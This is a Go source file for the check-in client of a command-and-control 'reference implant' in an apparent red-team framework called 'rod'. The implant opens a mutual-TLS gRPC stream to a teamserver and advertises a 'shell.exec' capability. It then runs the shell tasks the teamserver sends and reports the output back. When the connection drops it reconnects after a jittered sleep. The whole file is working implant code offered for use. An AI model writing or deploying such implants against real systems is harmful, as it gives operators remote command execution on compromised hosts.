// Package beacon is the reference implant's mTLS check-in client: it opens the
// long-lived reverse Beacon.CheckIn stream, completes the handshake, and then
// loops reading downstream tasking and writing upstream results
// (architecture.md Sec 5/8, Sec 10.3). The stream is bidirectional frames whose
// payloads are the rod.v1 handshake/task/result messages.
package beacon

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"errors"
	"fmt"
	"io"
	"log"
	"math/rand"
	"time"

	"github.com/cw/rod/implant/internal/exec"
	"github.com/cw/rod/implant/rodpb"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"google.golang.org/protobuf/proto"
)

// Caps are the capability verbs the reference implant advertises at handshake
// (architecture.md Sec 10). The teamserver gates dispatch on these; only the
// core shell verb is wired in this milestone.
var Caps = []string{"shell.exec"}

// Beacon runs the implant's check-in lifecycle against the teamserver: dial the
// mTLS endpoint, complete the handshake, then loop dispatching downstream tasks
// and reporting upstream results. It blocks until ctx is cancelled or the stream
// ends. The cadence follows the baked-in sleep + jitter profile.
type Beacon struct {
	beaconURL string
	leaf      tls.Certificate
	cas       []*x509.Certificate
	implantID string
	sleep     time.Duration
	jitter    time.Duration
	runner    *exec.Runner
	log       *log.Logger
}

// New builds a Beacon from an enrollment result and the beacon profile.
func New(beaconURL, implantID string, leaf tls.Certificate, cas []*x509.Certificate, sleep, jitter time.Duration, log *log.Logger) *Beacon {
	return &Beacon{
		beaconURL: beaconURL,
		leaf:      leaf,
		cas:       cas,
		implantID: implantID,
		sleep:     sleep,
		jitter:    jitter,
		runner:    exec.NewRunner(log),
		log:       log,
	}
}

// Run blocks until the stream ends or ctx is cancelled. It reconnects after a
// jittered sleep when the stream drops (implants are connection initiators;
// flapping is expected and handled by reconnecting, architecture.md Sec 8).
func (b *Beacon) Run(ctx context.Context) error {
	for {
		if err := b.runOnce(ctx); err != nil {
			b.log.Printf("beacon stream ended: %v", err)
		}
		if ctx.Err() != nil {
			return ctx.Err()
		}
		if err := b.sleepWithJitter(ctx); err != nil {
			return err
		}
	}
}

// runOnce performs one connect-handshake-task cycle. Returns the stream error
// when it ends (clean close, transport error, or handshake refusal).
func (b *Beacon) runOnce(ctx context.Context) error {
	pool := x509.NewCertPool()
	for _, ca := range b.cas {
		pool.AddCert(ca)
	}
	creds := credentials.NewTLS(&tls.Config{
		Certificates: []tls.Certificate{b.leaf},
		RootCAs:      pool,
		ServerName:   serverName(b.beaconURL),
		MinVersion:   tls.VersionTLS12,
	})

	conn, err := grpc.NewClient(b.beaconURL, grpc.WithTransportCredentials(creds))
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer conn.Close()

	client := rodpb.NewBeaconClient(conn)
	stream, err := client.CheckIn(ctx)
	if err != nil {
		return fmt.Errorf("open stream: %w", err)
	}
	defer stream.CloseSend()

	// The implant speaks first: handshake with its protocol version and identity.
	handshake := &rodpb.HandshakeRequest{
		Version:      &rodpb.ProtocolVersion{Major: 1, Minor: 0},
		ImplantId:    b.implantID,
		Capabilities: Caps,
	}
	payload, err := proto.Marshal(handshake)
	if err != nil {
		return fmt.Errorf("marshal handshake: %w", err)
	}
	if err := stream.Send(&rodpb.Frame{Payload: payload}); err != nil {
		return fmt.Errorf("send handshake: %w", err)
	}

	resp, err := stream.Recv()
	if err != nil {
		return fmt.Errorf("recv handshake: %w", err)
	}
	var hs rodpb.HandshakeResponse
	if err := proto.Unmarshal(resp.GetPayload(), &hs); err != nil {
		return fmt.Errorf("parse handshake response: %w", err)
	}
	if hs.GetStatus() != rodpb.HandshakeStatus_HANDSHAKE_STATUS_OK {
		return fmt.Errorf("handshake refused: %s", hs.GetStatus())
	}
	b.log.Printf("handshake ok: engagement=%s", hs.GetEngagementId())

	// Tasking loop: read TaskRequest downstream, dispatch, write TaskResult up.
	for {
		frame, err := stream.Recv()
		if err != nil {
			if errors.Is(err, io.EOF) {
				return nil
			}
			return fmt.Errorf("recv task: %w", err)
		}
		var task rodpb.TaskRequest
		if err := proto.Unmarshal(frame.GetPayload(), &task); err != nil {
			b.log.Printf("dropping non-task frame: %v", err)
			continue
		}
		outcome, output := b.runner.Dispatch(ctx, task.GetVerb(), task.GetArguments())
		result := &rodpb.TaskResult{
			TaskId:  task.GetTaskId(),
			Outcome: outcome,
			Output:  output,
		}
		resultPayload, err := proto.Marshal(result)
		if err != nil {
			b.log.Printf("marshal result: %v", err)
			continue
		}
		if err := stream.Send(&rodpb.Frame{Payload: resultPayload}); err != nil {
			return fmt.Errorf("send result: %w", err)
		}
	}
}

// sleepWithJitter sleeps for the base interval +/- jitter/2, honoring ctx.
func (b *Beacon) sleepWithJitter(ctx context.Context) error {
	d := b.sleep
	if b.jitter > 0 {
		delta := time.Duration(rand.Int63n(int64(b.jitter))) - b.jitter/2
		d += delta
	}
	if d < 0 {
		d = 0
	}
	select {
	case <-ctx.Done():
		return ctx.Err()
	case <-time.After(d):
		return nil
	}
}

// serverName extracts the host (without port) from the beacon URL for the TLS
// ServerName. The dev teamserver presents the CA cert as its own identity, so
// verification is chain-based (RootCAs) rather than name-based; we still set a
// ServerName so the TLS handshake has a name to send in SNI.
func serverName(beaconURL string) string {
	u := beaconURL
	if i := indexOf(u, "://"); i >= 0 {
		u = u[i+3:]
	}
	if i := indexOf(u, ":"); i >= 0 {
		u = u[:i]
	}
	if i := indexOf(u, "/"); i >= 0 {
		u = u[:i]
	}
	return u
}

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}
